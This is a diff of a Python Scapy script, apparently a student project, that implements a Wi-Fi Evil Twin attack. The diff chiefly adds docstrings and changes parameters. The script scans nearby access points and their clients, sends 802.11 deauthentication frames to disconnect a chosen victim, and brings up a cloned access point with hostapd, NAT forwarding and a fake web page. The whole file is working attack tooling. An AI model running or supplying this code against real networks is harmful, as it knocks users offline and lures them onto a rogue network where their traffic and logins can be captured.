@@ -19,6 +19,12 @@ users = list()
 
 
 def AP_handler(pkt):
+    """
+    The handler for the sniffing access points (802.11 layer and of type beacon only)
+    For each AP found it adds it to the global AP list.
+    :param pkt:
+    :return:
+    """
     global ap_list
     # Checking if the packets have a 802.11 layer and only of type beacon
     if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
@@ -31,6 +37,12 @@ def AP_handler(pkt):
 
 
 def users_handler(pkt):
+    """
+    The handler for the sniffing access users connected to the chosen access point.
+    For each user found it adds it to the global users list.
+    :param pkt:
+    :return:
+    """
     global users, chosen_ap_mac
     if (pkt.addr2 == chosen_ap_mac or pkt.addr3 == chosen_ap_mac) and \
             pkt.addr1 not in users and \
@@ -41,7 +53,14 @@ def users_handler(pkt):
         print(f"{len(users)}\t{pkt.addr1}")
 
 
-def scan_wlan(iface, channel_range=15, timeout=1):
+def scan_wlan(iface, channel_range=15, timeout=3):
+    """
+    Function to scan access points in the area
+    :param iface: interface name
+    :param channel_range: range of channels to scan on
+    :param timeout: timeout length for each channel
+    :return:
+    """
     print("\n\nScanning for access points...")
     print("Index\tAP Name\t\tMAC")
     for channel in range(1, channel_range):
@@ -49,7 +68,14 @@ def scan_wlan(iface, channel_range=15, timeout=1):
         sniff(iface=iface, count=0, prn=AP_handler, timeout=timeout)
 
 
-def scan_for_users(iface, channel_range=3, timeout=10):
+def scan_for_users(iface, channel_range=12, timeout=3):
+    """
+    Function to scan users connected to the chosen access point.
+    :param iface: interface name
+    :param channel_range: range of channels to scan users on
+    :param timeout: timeout length for each channel
+    :return:
+    """
     print("\n\nScanning for users...")
     print("Index\tUser MAC")
     for channel in range(1, channel_range):
@@ -61,9 +87,17 @@ def scan_for_users(iface, channel_range=3, timeout=10):
 
 
 def deauthenticate_victim(iface, victim_mac_addr, ap_mac_addr, channel):
-    # RadioTap is an additional layer, making it easier to transmit info between OSI Layers.
-    # First layer being a 802.11 layer with our input info for the attack
-    # Second Layer being the de-authentication DoS step: reason=1 -> unspecified reason
+    """
+    Function to deauthenticate and disconnect the chosen victim from his AP.
+    RadioTap is an additional layer, making it easier to transmit info between OSI Layers.
+    First layer being a 802.11 layer with our input info for the attack
+    Second Layer being the de-authentication DoS step: reason=1 -> unspecified reason
+    :param iface: interface name
+    :param victim_mac_addr: the mac address of the chosen victim
+    :param ap_mac_addr: the mac address of the chosen AP
+    :param channel: the channel of the AP
+    :return:
+    """
     os.system(f"sudo iwconfig {iface} channel {channel}")
 
     victim_packet = RadioTap() \
@@ -78,6 +112,12 @@ def deauthenticate_victim(iface, victim_mac_addr, ap_mac_addr, channel):
 
 
 def scan_captured_networks(ap_list, flag):
+    """
+    Function to choose a network from the scanned access points in the area
+    :param ap_list: the global list of found access points
+    :param flag: in case no users were found on chosen AP, it will run again
+    :return:
+    """
     global chosen_ap_mac
     captured = list(enumerate(ap_list, 1))
     print("\nAccess Points Captured:\n\n")
@@ -101,6 +141,11 @@ def scan_captured_networks(ap_list, flag):
 
 
 def choose_user_to_attack(user_list):
+    """
+    Function to choose a user/victim that is connected to the chosen AP
+    :param user_list:
+    :return:
+    """
     captured = list(enumerate(user_list, 1))
     print("\nUsers captured on chosen access point:\n\n")
     for key, value in captured:
@@ -120,7 +165,17 @@ def choose_user_to_attack(user_list):
     return chosen_user
 
 
+# Not used, but idea taken from here: https://www.thepythoncode.com/code/create-fake-access-points-scapy
 def send_beacon(iface, ssid, victim_mac_addr, mac, infinite=True):
+    """
+    Target function to send a beacon packet to create a fake AP
+    :param iface: interface name
+    :param ssid: name for the fake AP
+    :param victim_mac_addr: victim mac address
+    :param mac: mac address for the fake AP
+    :param infinite: if to keep the fake AP forever until closed manually
+    :return:
+    """
     # type=0:       management frame
     # subtype=8:    beacon frame
     dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
@@ -134,9 +189,16 @@ def send_beacon(iface, ssid, victim_mac_addr, mac, infinite=True):
         sendp(frame, iface=iface, verbose=0)
 
 
+# Not used, but idea taken from here: https://www.thepythoncode.com/code/create-fake-access-points-scapy
 def create_fake_ap(iface, victim, ap_name):
+    """
+    Creating a fake AP
+    :param iface: interface name
+    :param victim: chosen victim mac address
+    :param ap_name: SSID name for the fake AP created
+    :return:
+    """
     global chosen_ap_mac
-    # helper.reset()
     fake_mac_addr = RandMAC()
     Thread(target=send_beacon, args=(iface, ap_name, victim, fake_mac_addr)).start()
     print(f"\n*****\nFake AP Created:\nAP Name: {ap_name}\nAP Mac Address: {fake_mac_addr}\n*****")
@@ -144,34 +206,50 @@ def create_fake_ap(iface, victim, ap_name):
 
 # Helped using this website: https://zsecurity.org/how-to-start-a-fake-access-point-fake-wifi/
 def activate_fake_ap(iface, ssid):
+    """
+    Activating the fake AP we are creating using configurations from our hostapd file.
+    Also making the necessary changes and enable nat forwarding to use our wifi for its internet connection.
+    :param iface:
+    :param ssid:
+    :return:
+    """
     helper.reset()
-    os.system("sudo systemctl disable systemd-resolved.service")
-    os.system("sudo systemctl stop systemd-resolved")
-    # os.system("sudo service NetworkManager stop")
     helper.kill_processes()
     helper.create_hostapd_file(iface, ssid)
-    helper.enable_nat("enp2s0f0", iface)
+    os.system(f"sudo service apache2 start")
     # Start the fake access point in new terminal
     os.system("sudo gnome-terminal -- sh -c 'sudo hostapd conf_files/hostapd.conf -B; read line'")
 
-    helper.create_dnsmasq_file(iface)
     os.system(f"sudo ifconfig {iface} up 192.168.1.1 netmask 255.255.255.0")
     os.system("sudo route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
-    os.system("sudo gnome-terminal -- sh -c 'sudo dnsmasq -C conf_files/dnsmasq.conf -d; read line'")
 
     helper.ip_tables_config()
     helper.enable_nat("enp2s0f0", iface)
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # Enabling IP forwarding: 1-enable, 0-disable
+    os.system("sudo gnome-terminal -- sh -c 'firefox fake_web/index.html; readline'")
+    os.system("sudo ip route add 192.168.1.0/24 dev enp2s0f0")
 
-    os.system("sudo gnome-terminal -- sh -c 'node fake_web/index.js; readline'")
-    os.system("sudo route add default gw 10.0.0.1")
 
-
-def deactivate_fake_ap():
+def deactivate_fake_ap(iface):
+    """
+    Function to deactivate the fake AP that was created at the end of the program and reset.
+    :param iface: interface name
+    :return:
+    """
     helper.reset()
+    os.system("sudo ufw reload")
+    os.system("sudo systemctl enable systemd-resolved.service")
+    os.system("sudo systemd-resolve --flush-caches")
+    os.system("sudo service network-manager restart")
+    # os.system(f"sudo airmon-ng start {iface}")
 
 
 def network_attack(iface):
+    """
+    Main program that is used for the Evil Twin attack, which maintains the order of actions for the attack.
+    :param iface: interface name
+    :return:
+    """
     global interface_name, ap_list, users
     interface_name = iface
     # change_modes.init_attack_mode()
@@ -194,15 +272,15 @@ def network_attack(iface):
 
     deauthenticate_victim(iface, victim, chosen_ap_mac, channel=chosen_ap[2])
 
-    change_modes.deactivate_monitor_mode(iface)
+    # change_modes.deactivate_monitor_mode(iface)
 
     ap_name = chosen_ap[1]
     # create_fake_ap(iface, victim, ap_name="FakeAPHere!")
     activate_fake_ap(iface, ssid=ap_name)
 
-    deactivate = input("\n\nTo deactivate the fake AP, enter 'Y'...")
+    deactivate = input("\n\nTo deactivate the fake AP, enter 'Y'... ")
     if deactivate.lower() == 'y' or deactivate.lower() == 'yes':
-        deactivate_fake_ap()
+        deactivate_fake_ap(iface)
 
-
+    print("\n\nThanks for using our Evil Twin Tool!\n- Alon Firestein\n- Dvir Shaul\n- Yogev Chiprut")
 
